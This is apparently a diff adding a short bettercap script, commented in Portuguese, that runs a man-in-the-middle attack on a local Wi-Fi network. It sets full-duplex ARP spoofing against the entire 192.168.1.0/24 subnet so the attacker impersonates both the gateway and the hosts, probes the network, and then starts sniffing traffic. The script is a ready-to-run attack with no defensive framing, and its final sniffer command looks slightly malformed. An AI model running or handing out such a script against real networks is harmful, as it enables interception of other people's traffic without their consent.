@@ -1,0 +1,24 @@
+# Define a interface de rede
+set net.iface wlan0
+
+# Define o alvo: Toda a sub-rede exceto você e o gateway
+set arp.spoof.targets 192.168.1.0/24
+
+# Ataca em full-duplex: Você finge ser o gateway para o alvo E o alvo para o gateway
+set arp.spoof.fullduplex true
+
+# Opcional: Ignora erros de DNS para não poluir o log
+set events.ignore udp.dns
+
+# INÍCIO DA EXECUÇÃO
+
+net.probe on
+
+
+sleep 5
+
+
+arp.spoof on
+
+
+sniffer.on
